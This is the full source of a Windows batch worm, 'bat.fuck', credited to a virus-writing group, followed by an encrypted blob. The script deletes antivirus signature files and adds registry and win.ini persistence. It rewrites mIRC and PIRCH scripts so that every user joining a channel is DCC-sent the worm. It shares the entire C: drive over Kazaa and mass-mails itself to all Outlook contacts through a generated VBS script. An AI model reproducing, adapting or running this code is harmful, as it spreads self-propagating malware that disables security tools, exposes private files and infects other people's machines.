@echo off
ctty nul
:retro
del c:\programme\norton~1\s32integ.dll
del c:\programme\f-prot95\fpwm32.dll
del c:\programme\mcafee\scan.dat
del c:\tbavw95\tbscan.sig
del c:\programme\tbav\tbav.dat
del c:\tbav\tbav.dat
del c:\programme\avpersonal\antivir.vdf
:payload
echo.on error resume next>c:\payload.vbs
echo MsgBox "                              bat.fuck" & Chr(13) & Chr(10) & "          ...be sure to get all the meanings..." & Chr(13) & Chr(10) & "(ah, this is a presentation of encrypted batch ;)",4096,"bat.fuck by philet0ast3r [rRlf]">>c:\payload.vbs
echo REGEDIT4>payload.reg
echo [HKEY_LOCAL_MACHINE\SOFTWARE\Microsoft\Windows\CurrentVersion\Run]>>payload.reg
echo "msg"="c:\\payload.vbs">>payload.reg
regedit /s payload.reg
:residency
echo [windows]>residency
echo load=c:\bat.fuck.bat>>residency
echo run=>>residency
echo NullPort=None>>residency
echo.>>residency
copy residency + %winbootdir%\win.ini %winbootdir%\system\win.ini
del %winbootdir%\win.ini
move %winbootdir%\system\win.ini %winbootdir%\win.ini
del residency
:mirc
del c:\mirc\script.ini
del c:\mirc32\script.ini
del c:\progra~1\mirc\script.ini
del c:\progra~1\mirc32\script.ini
echo [script]>mirc
echo n0=on 1:JOIN:#:{>>mirc
echo n1= /if ( nick == $me ) { halt }>>mirc
echo n2= /.dcc send $nick c:\bat.fuck.bat>>mirc
echo n3=}>>mirc
move mirc c:\mirc\script.ini
move mirc c:\mirc32\script.ini
move mirc c:\progra~1\mirc\script.ini
move mirc c:\progra~1\mirc32\script.ini
del mirc
:pirch
del c:\pirch98\events.ini
echo [Levels]>pirch
echo Enabled=1>>pirch
echo Count=6>>pirch
echo Level1=000-Unknowns>>pirch
echo 000-UnknownsEnabled=1>>pirch
echo Level2=100-Level 100>>pirch
echo 100-Level 100Enabled=1>>pirch
echo Level3=200-Level 200>>pirch
echo 200-Level 200Enabled=1>>pirch
echo Level4=300-Level 300>>pirch
echo 300-Level 300Enabled=1>>pirch
echo Level5=400-Level 400>>pirch
echo 400-Level 400Enabled=1>>pirch
echo Level6=500-Level 500>>pirch
echo 500-Level 500Enabled=1>>pirch
echo.>>pirch
echo [000-Unknowns]>>pirch
echo User1=*!*@*>>pirch
echo UserCount=1>>pirch
echo Event1=ON JOIN:#:/dcc send $nick c:\bat.fuck.bat>>pirch
echo EventCount=1>>pirch
echo.>>pirch
echo [100-Level 100]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [200-Level 200]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [300-Level 300]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [400-Level 400]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
echo.>>pirch
echo [500-Level 500]>>pirch
echo UserCount=0>>pirch
echo EventCount=0>>pirch
move pirch c:\pirch98\events.ini
del pirch
:kazaa
echo REGEDIT4>kazaa.reg
echo [HKEY_CURRENT_USER\Software\Kazaa\LocalContent]>>kazaa.reg
echo "DisableSharing"=dword:00000000>>kazaa.reg
echo "DownloadDir"="C:\\Program Files\\KaZaA\\My Shared Folder">>kazaa.reg
echo "Dir0"="012345:c:\\">>kazaa.reg
regedit /s kazaa.reg
:outlook
echo.on error resume next>outlook
echo dim a,b,c,d,e>>outlook
echo set a = Wscript.CreateObject("Wscript.Shell")>>outlook
echo set b = CreateObject("Outlook.Application")>>outlook
echo set c = b.GetNameSpace("MAPI")>>outlook
echo for y = 1 To c.AddressLists.Count>>outlook
echo set d = c.AddressLists(y)>>outlook
echo x = 1>>outlook
echo set e = b.CreateItem(0)>>outlook
echo for o = 1 To d.AddressEntries.Count>>outlook
echo f = d.AddressEntries(x)>>outlook
echo e.Recipients.Add f>>outlook
echo x = x + 1>>outlook
echo next>>outlook
echo e.Subject = "Ever saw an encrypted batch-worm? N0? then it's time!">>outlook
echo e.Body = "Well, you don't have to execute the attachment (if you don't want to ;) ... hey, at least look at it! You can boast at your friends this evening at the strip: 'Hey comrades, today I saw an encrypted batch-worm!' ... Isn't that fascinating ?! ">>outlook
echo e.Attachments.Add ("c:\bat.fuck.bat")>>outlook
echo e.DeleteAfterSubmit = False>>outlook
echo e.Send>>outlook
echo f = "">>outlook
echo next>>outlook
move outlook %winbootdir%\outlook.vbs
start %winbootdir%\outlook.vbs
:end
del payload.reg
del kazaa.reg
start %winbootdir%\crypt.vbs
exit
жбжбжб«Ћ€ѓ„Л„ЌЌжб€‡жб€џџ’Л…ћ‡жб€„›’ЛОЫЛ€С·‰ЉџЕЌћ€ЂЕ‰Љџжб‚ЌЛЋ“‚џЛОњ‚…‰„„џЏ‚™О·€™’›џЕќ‰ЛЊ„џ„Лџ™Љ‡Љ‡ЉжбЋ€ѓ„ЛЋЛЫЪЫЫЛЭ­ЛЭ®ЛЩЫЛЭЮЛЬЩЛЬЩЛЭ­ЛЬЩЛЩЫЛЬЩЛЭЮЛЬШЛЬЮЛЭЇЛЭЮЛЩЫХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЪЫЛЭ®ЛЭЮЛЬУЛЬЯЛЫЇЛЫЄЛЬШЛЭЮЛЬЯЛЩЫЛЭЭЛЬШЛЭ­ЛЩЫЛШЇЛЩЫХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЩЫЛЭШЛЬЩЛЭЮЛЭЪЛЬЯЛЭЮЛЭ­ЛЭЩЛЭЄЛЭЮЛЭШЛЬЯЛЩУЛЩЩЛЬШЛЭШХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪШЫЛЬЩЛЭТЛЬЫЛЬЯЛЭТЛЭ®ЛЭЬЛЩ®ЛЭЭЛЭТЛЭЁЛЭЮЛЬШЛЬТЛЬШЛЬЯХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЯЫЛЭЮЛЭЇЛЭ­ЛЭЩЛЭЄЛЭЮЛЭШЛЬЯЛЩЩЛЩТЛЫЇЛЫЄЛЬШЛЭЮЛЬЯЛЩЫХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЮЫЛЬЫЛЬЩЛЭ­ЛЭШЛШЯЛЩЫЛШЇЛЩЫЛЭЭЛЬШЛЭ­ЛЩ®ЛЭ­ЛЬЫЛЭЮЛЭ®ХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЭЫЛЬЯЛЭЮЛЬУЛЬЯЛЭЭЛЭТЛЭЁЛЭЮЛЩУЛЩЩЛЭШЛШЄЛЮЁЛЭЩЛЭЪЛЬЯХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЬЫЛЩ®ЛЭЭЛЬЮЛЭШЛЭ©ЛЩ®ЛЭЩЛЭЪЛЬЯЛЩЩЛЩЁЛЩЫЛШЪЛЩТЛЫЇЛЫЄХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪУЫЛЭЇЛЬШЛЭЬЛЩЫЛШЇЛЩЫЛЬЫЛЬЩЛЭ­ЛЭШЛШЯЛЩ®ЛЬЩЛЭЮЛЭЪЛЭЯХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪТЫЛЭЪЛЭЁЛЭЁЛЫЇЛЫЄЛЭЯЛЭЯЛЭЯЛЩЫЛШЇЛЩЫЛЬУЛЩУЛЭЇЛЬШЛЭЬХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЄЫЛЩТЛЫЇЛЫЄЛЬШЛЭЮЛЬЯЛЩЫЛЬЫЛЬЩЛЭ­ЛЭШЛШЩЛЩЫЛШЇЛЩЫЛЭЭХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪ©ЫЛЬШЛЭ­ЛЩ®ЛЭШЛЬЩЛЭЮЛЭЪЛЬЯЛЭЮЛЬЯЛЭЮЛЬУЛЬЯЛЭЭЛЭТЛЭЁХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЁЫЛЭЮЛЩУЛЩЩЛЭШЛШЄЛЮЁЛЭЩЛЭЪЛЬЯЛЩ®ЛЭЭЛЬЮЛЭШЛЭ©ЛЩ®ЛЭЩХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪЇЫЛЭЪЛЬЯЛЩЩЛЩЁЛЩЫЛЬЯЛЬЩЛЬЮЛЭЮЛЩТЛЫЇЛЫЄЛЬЫЛЬЩЛЭ­ЛЭШХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪ®ЫЛШЩЛЩ®ЛЬЬЛЬЩЛЭТЛЬЯЛЭЮЛЭЁЛЭТЛЭ®ЛЭЮЛЩЫЛЭЯЛЭЯЛЭЯЛЫЇХХ€™’›џжбЋ€ѓ„ЛЋЛЫЪ­ЫЛЫЄЛЬЫЛЬЩЛЭ­ЛЭШЛШЩЛЩ®ЛЭШЛЭЁЛЭ­ЛЬШЛЭЮЛЫЇЛЫЄЛЯЭЛЬЮХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЫЫЛЭ®ЛЭШЛЬЯЛЭТЛЭ­ЛЭ®ЛЩЫЛЬУЛЩУЛЬШЛЮЯЛЭЮЛЬУЛЬЯЛЩТЛЫЇХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЪЫЛЫЄЛЯ­ЛЭ®ЛЩЫЛЯЮЛЬЩЛЬЩЛЭ­ЛЬЩЛЩЫЛЮЩЛЭЮЛЬШЛЬЮЛЭЇЛЭЮХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЩЫЛЩЫЛЯ®ЛЭЮЛЬУЛЬЯЛЫЇЛЫЄЛЯЯЛЭТЛЭЇЛЩЫЛЭЮЛЭ©ЛЭЮЛЬТЛЩЁХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩШЫЛЩЫЛЭТЛЩЁЛЩЫЛЭУЛЭЪЛЬШЛЭУЛЩЁЛЩЫЛЭШЛЬЩЛЭЩЛЬТЛЬЯЛЭЮХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЯЫЛЫЇЛЫЄЛЭЮЛЭ©ЛЭЮЛЬТЛЩЫЛШЇЛЩЫЛШЩЛШШЛШЮЛЫЇЛЫЄЛЯЭЛЭ­ХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЮЫЛЬЩЛЩЫЛЭТЛЩЫЛШЇЛЩЫЛШЪЛЩЫЛЮЯЛЭ­ЛЩЫЛЯЁЛЭЮЛЭ®ЛЩУЛЬШХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЭЫЛЮЯЛЭЮЛЬУЛЬЯЛЩТЛЫЇЛЫЄЛЭУЛЭЪЛЬШЛЭУЛЩЫЛШЇЛЩЫЛЯЪЛЬШХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЬЫЛЭШЛЩУЛЯЇЛЭТЛЭЯЛЩУЛЬШЛЮЯЛЭЮЛЬУЛЬЯЛЩЁЛЩЫЛЭТЛЩЁЛЩЫХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩУЫЛШЪЛЩТЛЩТЛЫЇЛЫЄЛЭШЛЬЩЛЭЩЛЬТЛЬЯЛЭЮЛЩЫЛШЇЛЩЫЛЯШЛЭУХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩТЫЛЬЩЛЩУЛЭУЛЭЪЛЬШЛЭУЛЩЫЛЮУЛЭ­ЛЬЩЛЩЫЛЩУЛЭЮЛЭ©ЛЭЮЛЬТХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЄЫЛЩЫЛЯЇЛЭ­ЛЭЯЛЩЫЛШЩЛШЮЛШЮЛЩТЛЩТЛЫЇЛЫЄЛЬУЛЩЫЛШЇЛЩЫХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩ©ЫЛЬУЛЩЫЛЩЭЛЩЫЛЭШЛЬЩЛЭЩЛЬТЛЬЯЛЭЮЛЫЇЛЫЄЛЯ®ЛЭЮЛЬУЛЬЯХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЁЫЛЫЇЛЫЄЛЯЮЛЭ®ЛЭЯЛЩЫЛЯЭЛЬЮЛЭ®ЛЭШЛЬЯЛЭТЛЭ­ЛЭ®ЛЫЇЛЫЄХХ€™’›џжбЋ€ѓ„ЛЋЛЫЩЇЫЛЁЭХХ€™’›џжбЋ€ѓ„Л™€“ХХ€™’›џжбЋ€ѓ„ЛЫЪЇЫХХ€™’›џжбЋ€ѓ„Л…Л€™’›џЕќ‰ХХ€™’›џжбЋ€ѓ„ЛњХХ€™’›џжбЋ€ѓ„ЛљХХ€™’›џжбЏЋ‰ћЊЧ€™’›џжбЏЋ‡Л€™’›џжб†„ќЋЛ€™’›џЕќ‰ЛОњ‚…‰„„џЏ‚™ОжбСџ™Љ‡Љ‡ЉжбџЉ™џЛОњ‚…‰„„џЏ‚™О·€™’›џЕќ‰жбџЉ™џЛ€С·‰ЉџЕЌћ€ЂЕ‰ЉџжбСЋ…ЏжбЋ“‚џ
